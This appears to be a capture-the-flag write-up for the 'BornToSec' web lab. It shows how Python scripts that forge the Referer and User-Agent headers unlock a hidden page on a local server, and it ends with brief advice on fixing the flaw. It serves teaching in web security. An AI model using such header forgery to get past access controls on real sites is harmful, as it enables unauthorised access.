# How

Clicking on the `BornToSec` copyright mention at the bottom of the page, you're redirected to an hidden page

Pressing CTRL+U to see the source code, you can toggle on `Line wrap`, scroll down at the bottom of the page's code,
and you will be able to see :

```html
<!--
You must come from : "https://www.nsa.gov/".
-->
```

This hints that you must come from the NSA website to access the hidden page, what does that mean ?

When your browser makes HTTP requests, it sends a `Referer` header, its value represents the URL that brought you where you are now.

Changing it with this Python script :

```py
import requests

headers = {
    'Referer': 'https://www.nsa.gov/'
}

resp = requests.get('http://localhost:4242/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)

print(resp.text)
```

Gives the output source, which now contains this :

```
Let's use this browser : "ft_bornToSec". It will help you a lot.
```

This time, we must change the `User-Agent` header to `ft_bornToSec` to access the hidden page.

```py
import requests

headers = {
    'Referer': 'https://www.nsa.gov/',
    'User-Agent': 'ft_bornToSec'
}

resp = requests.get('http://localhost:4242/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)

print(resp.text)
```

This time giving us the flag.

# Fix

- Don't trust request headers, they can be edited by the client.
- Use a session cookie to block access to sensitive pages.